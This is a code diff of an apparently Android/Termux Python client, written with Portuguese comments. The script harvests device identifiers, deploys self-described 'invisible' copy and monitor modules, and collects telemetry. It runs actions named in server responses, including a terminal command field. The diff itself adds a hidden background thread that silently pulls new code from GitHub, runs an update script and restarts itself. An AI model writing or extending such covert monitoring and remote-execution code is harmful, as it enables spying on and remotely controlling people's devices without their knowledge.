@@ -5,6 +5,7 @@ import time
 import json
 import uuid
 import signal
+import threading
 from datetime import datetime
 
 # ==========================================
@@ -162,7 +163,7 @@ elif len(sys.argv) > 1:
 else:
     guild_id = saved_config.get("guild_id", "")
     owner_id = saved_config.get("owner_id", "")
-    
+
 client_token = saved_config.get("client_token", None)
 
 if guild_id and owner_id:
@@ -251,7 +252,7 @@ try:
     if region == "Unknown" or not region: region = get_prop("getprop ro.product.locale")
     cpu_abi = get_prop("getprop ro.product.cpu.abi")
     processor = "64 bits" if "64" in cpu_abi else ("32 bits" if cpu_abi != "Unknown" and cpu_abi else "Unknown")
-    
+
     device_id = get_root_data("settings get secure android_id")
     if device_id == "Unknown" or not device_id: device_id = get_prop("settings get secure android_id")
     if device_id == "Unknown" or not device_id:
@@ -263,7 +264,7 @@ try:
             try:
                 with open(id_file, "w") as f: f.write(device_id)
             except: pass
-            
+
     if android_version != "Unknown" and "." in android_version: android_version = android_version.split(".")[0]
 
     report["system_info"] = {
@@ -286,6 +287,37 @@ def update_client_token(new_token):
             config["client_token"] = client_token
             with open(CONFIG_FILE, "w") as f: json.dump(config, f)
         except: pass
+
+# ==========================================
+# 📡 RADAR FANTASMA (UPDATE AUTOMÁTICO)
+# ==========================================
+def radar_de_updates():
+    """Roda em segundo plano checando o GitHub a cada 5 minutos."""
+    while True:
+        time.sleep(300) # Espera 5 minutos
+        try:
+            subprocess.run(["git", "fetch", "origin"], cwd=BASE_DIR, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            local = subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=BASE_DIR).decode('utf-8').strip()
+            remoto = subprocess.check_output(["git", "rev-parse", "origin/main"], cwd=BASE_DIR).decode('utf-8').strip()
+            
+            if local != remoto:
+                console.print("\n[bold red][🚨 ALERTA] Novo código detectado no GitHub![/bold red]")
+                console.print("[bold yellow][🔄] Iniciando protocolo de atualização e re-blindagem...[/bold yellow]")
+                
+                # Executa o seu update.sh que baixa o código e gera os novos hashes
+                subprocess.run(["bash", "update.sh"], cwd=BASE_DIR)
+                
+                console.print("[bold green][♻️] Atualização concluída. Reiniciando os módulos de segurança...[/bold green]")
+                
+                # Reinicia o próprio import.py do zero para carregar os novos hashes
+                os.execv(sys.executable, ['python'] + sys.argv)
+        except Exception:
+            pass
+
+# Inicia o Radar como um processo fantasma independente
+thread_radar = threading.Thread(target=radar_de_updates, daemon=True)
+thread_radar.start()
+# ==========================================
 
 spinner = Halo(text='Deploying background modules...', spinner='dots')
 spinner.start()
@@ -317,7 +349,7 @@ try:
     os.system(monitor_cmd)
 
     spinner.succeed("Invisible modules (Copy & Monitor) deployed successfully!")
-except Exception as e: 
+except Exception as e:
     spinner.fail(f"Error deploying modules: {e}")
 
 registered_in_db = False
@@ -331,7 +363,7 @@ try:
     while True:
         now = time.time()
         last_action = max(last_check, get_last_activity())
-        
+
         if now - last_action >= PING_INTERVAL or not registered_in_db:
             try:
                 install_success = []
@@ -377,11 +409,11 @@ try:
                     spec = importlib.util.spec_from_file_location("sensores", sensores_path)
                     sensores_module = importlib.util.module_from_spec(spec)
                     spec.loader.exec_module(sensores_module)
-                    
+
                     res_telemetria = sensores_module.coletar_telemetria_completa()
                     # Se retornar a tupla (relatorio, dna, ts), pegamos apenas o relatorio
                     telemetry_data = res_telemetria[0] if isinstance(res_telemetria, tuple) else res_telemetria
-                except Exception as e: 
+                except Exception as e:
                     telemetry_data = {"erro": str(e)}
 
                 # ==========================================
@@ -479,7 +511,7 @@ try:
                                     with open(PAYLOAD_FILE, "w") as pf: json.dump(response_json, pf)
                                     subprocess.run([sys.executable, brain_script_path, "--file", PAYLOAD_FILE], check=True)
                                 except: pass
-                                
+
                     if response_json.get("mudo") == True:
                         git_cmd = response_json.get("comando_terminal", "git pull")
                         os.system("pkill -f auto_copy.py > /dev/null 2>&1")
